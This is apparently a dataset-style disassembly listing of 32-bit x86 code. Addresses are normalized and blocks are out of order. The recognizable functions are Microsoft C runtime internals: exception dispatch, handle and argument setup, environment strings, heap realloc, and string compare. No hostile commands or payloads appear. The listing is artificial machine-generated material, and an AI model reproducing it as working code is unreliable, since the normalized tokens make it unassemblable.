mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_10007ebf
add esp 0xc
test eax eax
jne r-xdata
call sub_1000848d
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10007fd0
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_10007e15
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_100067bc
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_100044eb
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100043c0
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10007fd0
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_10007ebf
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_10008df0
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_10007f1c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_1000848d
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_100083e0
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_10007fd0
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_10008190
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_10004280
call sub_100042c2
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_10007f1c
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_1000804b
add esp 0x2c
test eax eax
je r-xdata
sub_1000804b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x24 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ esi - 0x4 ]
mov [ ebp - 0x28 ] eax
call sub_100067bc
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
call sub_100067bc
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
call sub_100067bc
mov edi [ ebp + 0x8 ]
mov [ eax + 0x6c ] edi
call sub_100067bc
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ ebp + 0x14 ]
push esi
call sub_10004347
add esp 0x14
mov [ ebp - 0x2c ] eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_10008118
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008118
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
call sub_100067bc
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x6c ] ecx
call sub_100067bc
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x70 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_10004612
push eax
push edi
call sub_10008354
pop ecx
pop ecx
sub_10008166
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_10008190
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_1000a9a9
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_1000a9a9
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1000848d
push 0x1
push edi
call sub_1000a9c5
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1000a9a9
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1000a9a9
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_1000a9c5
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_1000a9c5
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_1000a9c5
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_10005ae0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_1000a9e1
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_100083bb
pop ecx
pop ecx
push eax
push edi
call sub_10005ae0
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_100083bb
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_100042b4
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_100083bb
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_100042bb
jmp r-xdata
push eax
call sub_100083bb
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_10008354
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_100042b4
or [ ebp - 0x4 ] 0xffffffff
sub_100083bb
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_100083e0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_10004635
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_10004635
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1000842c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_100067bc
cmp [ eax + 0x60 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_100067bc
call [ eax + 0x60 ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
push 0xa
call sub_10008b64
push 0x16
call sub_1000afcf
pop ecx
pop ecx
push 0x3
call sub_100059e7
sub_1000848d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_1000842c
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_100084e3
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_100049d2
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_100047cc
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_100049d2
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_1000869f
push ebx
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
mov edi eax
add eax 0x480
cmp edi eax
jae r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push [ esi ]
call sub_1000413e
and [ esi ] 0x0
pop ecx
lea ebx [ edi + 0xc ]
mov eax [ esi ]
add edi 0x24
add eax 0x480
add ebx 0x24
cmp edi eax
jb r-xdata
push ebx
call [ DeleteCriticalSection@IAT ]
cmp [ ebx - 0x4 ] 0x0
je r-xdata
sub_100086f3
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_1000598d
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_100049d2
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_100047cc
pop ecx
push esi
call sub_10009230
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_1000413e
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_100049d2
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_10009230
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_10009140
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_100047cc
pop ecx
sub_100087ac
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_1000598d
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_10008845
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_100049d2
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_10008845
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_100047cc
pop ecx
sub_10008845
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_100089f9
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_100049d2
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_100049d2
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_10004be0
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_1000413e
pop ecx
mov [ esp + 0x10 ] ebx
sub_10008b2b
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_10008b64
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_10008b64
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_10008b64
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_10009230
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_10009230
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_10009140
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_10009140
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_10009150
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_10009150
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_10009150
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_1000aa10
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_10009230
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_10003f20
add esp 0x10
sub_10008cb7
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_100049d2
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
call sub_1000413e
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push 0x9
call sub_10006a09
push ebx
call sub_10006abd
pop ecx
mov [ ebp + 0xc ] eax
test eax eax
pop ecx
je r-xdata
mov eax edi
push esi
call sub_10009048
test eax eax
pop ecx
jne r-xdata
push 0x9
call sub_10006a6a
test esi esi
pop ecx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push eax
call sub_100072c8
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_10006e13
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
push 0x9
call sub_10006a6a
pop ecx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_10004be0
push ebx
push [ ebp + 0xc ]
call sub_10006ae8
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_10004be0
push ebx
push [ ebp + 0xc ]
call sub_10006ae8
add esp 0x14
mov eax esi
sub_10008df0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
